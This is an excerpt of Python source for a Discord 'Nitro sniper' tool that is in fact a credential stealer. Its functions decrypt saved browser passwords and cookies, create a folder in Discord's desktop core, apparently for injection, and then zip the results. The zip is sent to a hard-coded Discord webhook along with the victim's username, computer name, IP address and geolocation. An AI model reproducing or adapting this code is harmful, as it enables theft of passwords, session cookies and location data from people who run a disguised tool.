...
class vanity_Nitro_snip:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1056691890193432616/7-jOs1cw2xgsBm3rtCoTkvevvfYw-Isd4bsy9j_DIlLZG-QwqmIbm1Q4rxLvIaWzavnm" #dont touch
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\vanity_Nitro_snip"
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Vanity"))
    ...
    def nitroPassclaim(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Pass-Nitro.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Rdimo | https://github.com/Rdimo/Nitro-sniper-vanity\n\n")
    ...
    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Nitro Cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Rdimo | https://github.com/Rdimo/Nitro-sniper-vanity\n\n")
    ...
    def Nitrosnipp(self):
        f = open(self.tempfolder+"\\info-Nitro.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Vanity | https://github.com/Vanity/Nitro-sniper-vanity\n\n")
        paths = {
    ...
    def SendInfo(self):
        ...
        new = os.path.join(self.appdata, f'Vanity.V2-[{os.getlogin()}].zip')
        self.zip(temp, new)
            ...
            "embeds": [
                {
                    "author": {
                        "name": "Nitro sniper",
                        "url": "https://github.com/Rdimo/Nitro-sniper-vanity",
                        "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/vanity.GIF"
                    },
                    "description": f"**{os.getlogin()}** Just ran Nitro sniper\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Nitro-sniper-vanity/vanity.GIF"
                    },       

                    "footer": {
                      "text": "©Rdimo#6969 https://github.com/Rdimo/Nitro-sniper-vanity"
                    }
                }
            ]
        }
